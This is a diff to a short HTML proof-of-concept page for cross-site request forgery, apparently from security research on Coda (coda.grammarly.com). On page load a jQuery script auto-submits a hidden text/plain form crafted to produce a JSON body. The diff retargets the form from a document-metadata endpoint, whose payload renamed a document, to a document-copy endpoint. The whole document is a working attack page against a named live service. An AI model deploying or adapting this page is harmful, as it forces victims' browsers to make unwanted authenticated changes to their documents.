@@ -5,13 +5,13 @@
     <script>
       $(document).ready(
         function() {
-          $("#z").attr("name",'{"title":"csrf poc doc name changed","fakeparam":"');
+          $("#z").attr("name",'{"fakeparam":"');
           $('#f').trigger('submit');
       });
     </script>
   </head>
 <body>
-  <form id="f" ENCTYPE="text/plain" action="https://coda.grammarly.com/internalAppApi/documents/4OpZ_kmeUg/metadata/" method="post">
+  <form id="f" ENCTYPE="text/plain" action="https://coda.grammarly.com/copy/4OpZ_kmeUg" method="post">
     <input id="z" type="hidden" name='test' value='test"}'>
   </form>
 </body>
